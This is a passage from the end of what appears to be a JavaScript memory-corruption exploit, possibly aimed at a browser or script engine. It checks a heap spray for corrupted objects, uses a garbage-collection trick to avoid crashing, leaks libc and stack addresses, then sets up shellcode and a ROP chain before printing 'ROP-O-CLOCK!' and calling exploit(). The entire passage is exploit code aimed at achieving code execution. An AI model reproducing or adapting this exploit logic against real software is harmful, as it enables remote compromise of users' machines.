			pwn.hbuf_obj = spray[hobj_idx];
			pwn.buf_offset = hbuffer_offset;
			break;
		}
	}

	if(pwn.hobj == 0 || pwn.hbuf_obj == 0 || pwn.buf_offset == 0) {
		log("[-] Exploit failed ...")
		return;
	}

	pwn.set_ctx();
	// gc-trick to avoid potential crash, null object and trigger gc, then restore object and our corruption
	pwn.reset_ctx();
	pwn.leak_libc(pwn.next_ptr);
	pwn.leak_stack();
	pwn.setup_shellcode();
	pwn.setup_rop();
	console.log("[*] ROP-O-CLOCK!");
}
exploit();

